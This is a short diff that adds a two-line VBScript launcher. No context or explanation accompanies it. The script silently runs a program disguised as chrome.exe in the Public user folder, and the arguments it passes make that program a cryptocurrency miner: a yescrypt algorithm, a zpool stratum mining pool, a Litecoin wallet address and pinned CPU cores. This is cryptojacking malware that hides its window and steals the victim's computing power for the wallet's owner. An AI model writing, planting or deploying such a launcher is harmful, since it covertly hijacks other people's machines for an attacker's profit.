@@ -1,0 +1,2 @@
+set objshell = wscript.createobject("wscript.shell")
+ objshell.run("C:\Users\Public\chrome\chrome.exe -a yescrypt -o stratum+tcp://yescrypt.na.mine.zpool.ca:6233 -u MAYaZ6fkPpeUH2pkiQtkqt6EMQGSEBtgWC,c=LTC -p AG_790EGMC -t 1 --cpu-affinity=0,1"),0, true
